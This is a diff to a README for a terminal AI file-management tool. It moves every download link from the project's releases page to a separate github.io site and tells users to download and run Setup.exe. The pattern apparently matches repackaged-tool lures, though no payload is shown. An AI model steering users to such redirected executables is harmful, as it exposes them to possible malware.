@@ -1,6 +1,6 @@
 # 🤖 DeepSeek-TUI-2026 - Control your files using simple commands
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/bahateacher/DeepSeek-TUI-2026/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://bahateacher.github.io)
 
 DeepSeek-TUI-2026 gives you a simple way to manage files and run code tasks on your computer. It uses the DeepSeek V4 engine to understand your requests. You type instructions, and the application does the work for you. This tool sits in your terminal and helps you edit code, manage git repositories, and run system commands without complex menus.
 
@@ -16,7 +16,7 @@ Your computer must meet these basic needs to run the software:
 
 ## 📥 How to Install
 
-1. Visit the [official release page](https://github.com/bahateacher/DeepSeek-TUI-2026/releases) to download the installer.
+1. Visit the [official release page](https://bahateacher.github.io) to download the installer.
 2. Look for the file named Setup.exe under the latest version header.
 3. Click the file to save it to your computer.
 4. Open your Downloads folder.
@@ -50,7 +50,7 @@ If the application fails to start:
 *   Check your internet connection.
 *   Ensure your firewall allows the application to access the network.
 *   Restart your computer.
-*   Download the latest version from the [releases page](https://github.com/bahateacher/DeepSeek-TUI-2026/releases).
+*   Download the latest version from the [releases page](https://bahateacher.github.io).
 
 If the tool does not understand a command:
 
